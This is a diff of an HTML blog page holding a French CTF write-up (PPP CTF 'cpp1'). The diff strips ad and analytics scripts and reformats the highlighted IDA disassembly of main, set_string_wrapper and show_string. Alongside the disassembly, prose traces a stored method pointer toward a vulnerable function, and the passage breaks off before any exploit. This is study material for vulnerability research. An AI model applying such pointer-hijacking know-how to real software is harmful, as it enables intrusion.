@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2011/04/25/plaid-parliament-of-pawning-ctf-cpp1-in.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -150,33 +130,34 @@
 25
 26
 27
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="c">; =============== S U B R O U T I N E =======================================</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="c">; Attributes: noreturn</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="n">main</span>            <span class="n">proc</span> <span class="n">near</span>               <span class="c">; DATA XREF: start+17 o</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="n">nptr</span>            <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">30</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="n">value</span>           <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">2</span><span class="n">Ch</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="k">str</span>             <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">28</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span> <span class="n">arg_0</span>           <span class="o">=</span> <span class="n">byte</span> <span class="n">ptr</span>  <span class="mi">4</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">C9</span>                 <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">CD</span>                 <span class="k">and</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">0</span><span class="n">FFFFFFF0h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D0</span>                 <span class="k">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ecx</span><span class="o">-</span><span class="mi">4</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D3</span>                 <span class="k">push</span>    <span class="n">ebp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D4</span>                 <span class="k">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D6</span>                 <span class="k">push</span>    <span class="n">ecx</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">D7</span>                 <span class="k">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">24</span><span class="n">h</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">DA</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span><span class="p">,</span> <span class="n">ecx</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="kt">DD</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">E0</span>                 <span class="k">cmp</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[eax],</span> <span class="mi">2</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">E3</span>                 <span class="k">jg</span>      <span class="n">short</span> <span class="n">loc_80487F5</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">E5</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">E8</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">EB</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">ED</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">nptr</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F0</span>                 <span class="k">call</span>    <span class="n">usage</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="c1">; Attributes: noreturn</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="nv">main</span>            <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; DATA XREF: start+17 o</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="nv">nptr</span>            <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">30h</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="nv">value</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">2Ch</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="nv">str</span>             <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">28h</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span> <span class="nv">arg_0</span>           <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span>  <span class="mi">4</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">C9</span>                 <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="nv">arg_0</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">CD</span>                 <span class="nv">and</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0FFFFFFF0h</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">D0</span>                 <span class="nv">push</span>    <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">D3</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">D4</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">D6</span>                 <span class="nv">push</span>    <span class="nb">ecx</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">D7</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">24h</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">DA</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">18h</span><span class="p">],</span> <span class="nb">ecx</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="kd">DD</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">18h</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">E0</span>                 <span class="nv">cmp</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">eax</span><span class="p">],</span> <span class="mi">2</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">E3</span>                 <span class="nv">jg</span>      <span class="nv">short</span> <span class="nv">loc_80487F5</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">E5</span>                 <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">18h</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">E8</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">EB</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">ED</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">30h</span><span class="o">+</span><span class="nv">nptr</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">F0</span>                 <span class="nv">call</span>    <span class="nv">usage</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Nous avons ensuite un appel vers une fonction qui prend le pointeur this en paramètre.</p>
 
@@ -186,12 +167,13 @@
 4
 5
 6
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F5</span> <span class="c">; ---------------------------------------------------------------------------</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F5</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F5</span> <span class="n">loc_80487F5</span><span class="o">:</span>                            <span class="c">; CODE XREF: main+1A j</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F5</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">F8</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">nptr</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">080487</span><span class="n">FB</span>                 <span class="k">call</span>    <span class="n">set_string_wrapper</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">080487</span><span class="nf">F5</span> <span class="c1">; ---------------------------------------------------------------------------</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">F5</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">F5</span> <span class="nv">loc_80487F5</span><span class="p">:</span>                            <span class="c1">; CODE XREF: main+1A j</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">F5</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0Ch</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">F8</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">30h</span><span class="o">+</span><span class="nv">nptr</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">080487</span><span class="nf">FB</span>                 <span class="nv">call</span>    <span class="nv">set_string_wrapper</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Cette fonction va initialiser un pointeur de méthode dans l’objet en utilisant le pointeur this passé en paramètre.</p>
 
@@ -210,26 +192,28 @@
 13
 14
 15
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span> <span class="c">; =============== S U B R O U T I N E =======================================</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span> <span class="c">; Attributes: bp-based frame</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span> <span class="n">set_string_wrapper</span> <span class="n">proc</span> <span class="n">near</span>            <span class="c">; CODE XREF: main+32 p</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span> <span class="n">arg_0</span>           <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048846</span>                 <span class="k">push</span>    <span class="n">ebp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048847</span>                 <span class="k">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048849</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804884</span><span class="n">C</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[eax],</span> <span class="n">offset</span> <span class="n">offset_show_string</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048852</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048853</span>                 <span class="k">retn</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048853</span> <span class="n">set_string_wrapper</span> <span class="n">endp</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">08048846</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+<span class="nl">.text:</span><span class="err">08048846</span>
+<span class="nl">.text:</span><span class="err">08048846</span> <span class="c1">; Attributes: bp-based frame</span>
+<span class="nl">.text:</span><span class="err">08048846</span>
+<span class="nl">.text:</span><span class="err">08048846</span> <span class="nf">set_string_wrapper</span> <span class="nv">proc</span> <span class="nv">near</span>            <span class="c1">; CODE XREF: main+32 p</span>
+<span class="nl">.text:</span><span class="err">08048846</span>
+<span class="nl">.text:</span><span class="err">08048846</span> <span class="nf">arg_0</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mi">8</span>
+<span class="nl">.text:</span><span class="err">08048846</span>
+<span class="nl">.text:</span><span class="err">08048846</span>                 <span class="nf">push</span>    <span class="nb">ebp</span>
+<span class="nl">.text:</span><span class="err">08048847</span>                 <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nl">.text:</span><span class="err">08048849</span>                 <span class="nf">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">arg_0</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804884</span><span class="nf">C</span>                 <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">eax</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">offset_show_string</span>
+<span class="nl">.text:</span><span class="err">08048852</span>                 <span class="nf">pop</span>     <span class="nb">ebp</span>
+<span class="nl">.text:</span><span class="err">08048853</span>                 <span class="nf">retn</span>
+<span class="nl">.text:</span><span class="err">08048853</span> <span class="nf">set_string_wrapper</span> <span class="nv">endp</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Cette pointeur pointe vers l’addresse 0x08048B20 où se trouve l’addresse d’une fonction d’affichage.</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>.rodata:08048B20 offset_show_string dd offset show_string ; DATA XREF: set_string_wrapper+6</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>.rodata:08048B20 offset_show_string dd offset show_string ; DATA XREF: set_string_wrapper+6
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>La fonction d’affichage est un simple wrapper pour printf() et prend une chaîne de caractère en paramètre (aucun intérêt à mon goût).</p>
 
@@ -251,36 +235,39 @@
 16
 17
 18
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span> <span class="c">; =============== S U B R O U T I N E =======================================</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span> <span class="c">; Attributes: bp-based frame</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span> <span class="n">show_string</span>     <span class="n">proc</span> <span class="n">near</span>               <span class="c">; DATA XREF: .rodata:offset_show_string o</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span> <span class="k">str</span>             <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">0</span><span class="n">Ch</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048854</span>                 <span class="k">push</span>    <span class="n">ebp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048855</span>                 <span class="k">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048857</span>                 <span class="k">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804885</span><span class="n">A</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="k">str</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804885</span><span class="n">D</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048861</span>                 <span class="k">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[esp],</span> <span class="n">offset</span> <span class="n">aS</span> <span class="c">; "%s"</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048868</span>                 <span class="k">call</span>    <span class="n">_printf</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804886</span><span class="n">D</span>                 <span class="k">leave</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804886</span><span class="n">E</span>                 <span class="k">retn</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804886</span><span class="n">E</span> <span class="n">show_string</span>     <span class="n">endp</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="nl">.text:</span><span class="err">08048854</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
+<span class="nl">.text:</span><span class="err">08048854</span>
+<span class="nl">.text:</span><span class="err">08048854</span> <span class="c1">; Attributes: bp-based frame</span>
+<span class="nl">.text:</span><span class="err">08048854</span>
+<span class="nl">.text:</span><span class="err">08048854</span> <span class="nf">show_string</span>     <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; DATA XREF: .rodata:offset_show_string o</span>
+<span class="nl">.text:</span><span class="err">08048854</span>
+<span class="nl">.text:</span><span class="err">08048854</span> <span class="nf">str</span>             <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span>  <span class="mh">0Ch</span>
+<span class="nl">.text:</span><span class="err">08048854</span>
+<span class="nl">.text:</span><span class="err">08048854</span>                 <span class="nf">push</span>    <span class="nb">ebp</span>
+<span class="nl">.text:</span><span class="err">08048855</span>                 <span class="nf">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nl">.text:</span><span class="err">08048857</span>                 <span class="nf">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">8</span>
+<span class="nl">.text:</span><span class="err">0804885</span><span class="nf">A</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">str</span><span class="p">]</span>
+<span class="nl">.text:</span><span class="err">0804885</span><span class="nf">D</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">eax</span>
+<span class="nl">.text:</span><span class="err">08048861</span>                 <span class="nf">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">aS</span> <span class="c1">; "%s"</span>
+<span class="nl">.text:</span><span class="err">08048868</span>                 <span class="nf">call</span>    <span class="nv">_printf</span>
+<span class="nl">.text:</span><span class="err">0804886</span><span class="nf">D</span>                 <span class="nv">leave</span>
+<span class="nl">.text:</span><span class="err">0804886</span><span class="nf">E</span>                 <span class="nv">retn</span>
+<span class="nl">.text:</span><span class="err">0804886</span><span class="nf">E</span> <span class="nv">show_string</span>     <span class="nv">endp</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Au final, set_string_wrapper() va faire la chose suivante:</p>
 
 <figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="k">this</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="mh">0x08048B20</span>
-<span class="o">*</span><span class="mh">0x08048B20</span> <span class="o">=</span> <span class="n">show_string</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">*</span><span class="mh">0x08048B20</span> <span class="o">=</span> <span class="n">show_string</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>ce qui donne donc:</p>
 
 <figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="k">this</span><span class="o">-&gt;</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">show_string</span><span class="p">().</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="k">this</span><span class="o">-&gt;</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">show_string</span><span class="p">().</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Maintenant revenons à la suite de notre fonction main(). Celle-ci va ensuite faire un
 appel à atoi() pour convertir le argv[2] en entier pour ensuite appeler vuln() en passant
@@ -312,37 +299,39 @@ argv[2] et argv[1].</p>
 24
 25
 26
-</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048800</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048803</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048806</span>                 <span class="k">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">8</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048809</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804880</span><span class="n">B</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">nptr</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span> <span class="c">; nptr</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804880</span><span class="n">E</span>                 <span class="k">call</span>    <span class="n">_atoi</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048813</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048816</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">18</span><span class="n">h</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048819</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mi">4</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804881</span><span class="n">C</span>                 <span class="k">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">4</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804881</span><span class="n">F</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[eax]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048821</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="k">str</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048825</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">08048828</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">value</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804882</span><span class="n">C</span>                 <span class="k">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">0</span><span class="n">Ch</span><span class="err">]</span>
-<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0804882</span><span class="n">F</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">nptr</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
